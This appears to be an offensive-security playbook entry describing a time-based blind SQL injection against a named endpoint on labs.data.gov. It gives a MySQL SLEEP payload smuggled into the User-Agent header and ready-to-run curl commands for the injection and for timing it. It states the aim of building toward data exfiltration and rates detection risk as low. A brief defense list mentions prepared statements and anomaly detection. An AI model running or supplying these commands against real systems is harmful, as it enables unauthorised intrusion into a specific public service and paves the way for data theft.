---
id: proc-6s-delay
tags:
  - sqli
  - blind-sqli
  - time-based
  - mysql
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/curl-inject-6s-payload]]'
  - '[[commands/sql-payload-6s-sleep]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:10.344Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Confirm-SQLi-with-6-Second-Delay

## Summary

This procedure employs a variable arithmetic payload (6*6-30=6) in the SQL injection to induce a 6-second server sleep, providing additional evidence of control over SQL execution in the User-Agent header for the labs.data.gov endpoint.

## Description

This variation tests the injection's ability to handle complex expressions, using subtraction in the SLEEP argument to create a shorter, measurable delay. It reinforces the blind SQLi by showing precise timing manipulation, applicable in scenarios where longer delays might trigger timeouts or alerts in the vulnerable web application.

## Requirements

1. Prior confirmation of injection via longer delays
2. HTTP client with timeout >10 seconds
3. Familiarity with MySQL expression evaluation
4. Stable network for timing accuracy

## Defense

Defensive measures and detection strategies:

- Escape or reject headers containing arithmetic operators or SQL functions
- Deploy anomaly detection for response times between 5-30 seconds
- Use prepared statements for all database interactions
- Conduct code reviews for header usage in queries

## Objectives

1. Demonstrate arithmetic operations in injected SQL
2. Verify shorter delay for iterative testing
3. Build toward data exfiltration techniques

## Instructions

### Step 1: Deploy Variable Delay Payload

**Context**: Inject the payload with subtraction to calculate a 6-second sleep, testing expression parsing.

**Command** ([[commands/sql-payload-6s-sleep]]):
```sql
XOR(if(now()=sysdate(),sleep(6*6-30),0))OR
```

> Computes 36-30=6 for SLEEP(6) if condition holds.

**Command** ([[commands/curl-inject-6s-payload]]):
```bash
curl -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(6*6-30),0))OR'" -H "Referer: 1" -H "X-Forwarded-For: 1" -H "X-Requested-With: XMLHttpRequest" -H "Accept-Encoding: gzip,deflate" -H "Accept: */*" --connect-timeout 10 https://labs.data.gov/dashboard/datagov/csv_to_json
```

> Response should delay by 6 seconds.

### Step 2: Verify Timing Precision

**Context**: Use timing output to measure exact delay and confirm calculation.

**Command** (timed execution):
```bash
curl -w "%{time_total}s" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(6*6-30),0))OR'" -H "Referer: 1" --connect-timeout 10 https://labs.data.gov/dashboard/datagov/csv_to_json
```

> Expect total time around 6 seconds.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques

-

## Commands Used

- [[commands/curl-inject-6s-payload]]
- [[commands/sql-payload-6s-sleep]]

## Tools Used

-

## Tags

- sqli
- blind-sqli
- time-based
- mysql
